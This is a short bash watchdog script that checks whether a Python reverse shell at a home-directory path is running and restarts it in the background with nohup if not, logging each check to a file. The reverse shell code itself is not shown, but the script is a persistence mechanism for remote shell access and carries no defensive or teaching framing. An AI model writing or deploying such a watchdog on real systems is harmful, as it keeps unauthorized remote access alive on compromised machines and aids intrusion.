#!/bin/bash

# Path to the reverse shell script
SCRIPT_PATH="/home/kit/sky/reverse_shell.py"
LOG_FILE="/home/kit/sky/watchdog.log"

# Function to log messages
log_message() {
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Check if the reverse shell script is running
if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
    log_message "Reverse shell script not running. Starting it..."
    nohup python3 "$SCRIPT_PATH" >> "$LOG_FILE" 2>&1 &
else
    log_message "Reverse shell script is already running."
fi
